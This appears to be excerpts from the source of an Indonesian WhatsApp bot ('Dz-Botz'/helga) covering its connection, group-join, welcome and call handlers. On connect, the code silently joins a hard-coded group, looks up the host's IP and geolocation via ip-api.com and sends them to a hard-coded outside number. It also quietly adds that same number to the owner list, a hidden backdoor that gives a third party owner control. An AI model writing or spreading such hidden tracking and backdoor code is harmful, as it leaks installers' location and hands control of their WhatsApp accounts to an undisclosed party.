...
helga.autoReconnect = ReconnectMode.onConnectionLost
 ...
 teks = `https://chat.whatsapp.com/Hxw9KQgBFiE4t35tVexuys`
 helga.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Joined to Dziki Bot Official group', 'cyan'))
 helga.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(helga.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Dz-Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./helga.jpg'),sourceUrl:"https://wa.me/6285783909322?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       helga.sendMessage("18783021508@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Dz-Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./helga.jpg'),sourceUrl:"https://wa.me/6285783909322?text=Assalamualaikum"}}})
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   helga.on('chat-update', async (mek) => {
        ...
        ownerNumber = ["18783021508@s.whatsapp.net","18783021508@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "18783021508@s.whatsapp.net"
    ...
    //SERAH LU MAU GANTI KYK MANA
        helga.on('group-participants-update', async (anu) => {
           mem = anu.participants[0]
			...
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Dz-Offc;;;\nFN:Dz-offc\nitem1.TEL;waid=18783021508:18783021508\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
...
helga.on('CB:action,,call', async json => {
        ...
        helga.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./helga.jpg'),sourceUrl:`https://wa.me/6285783909322?text=Assalamualaikum`}}})
        await sleep(5000)
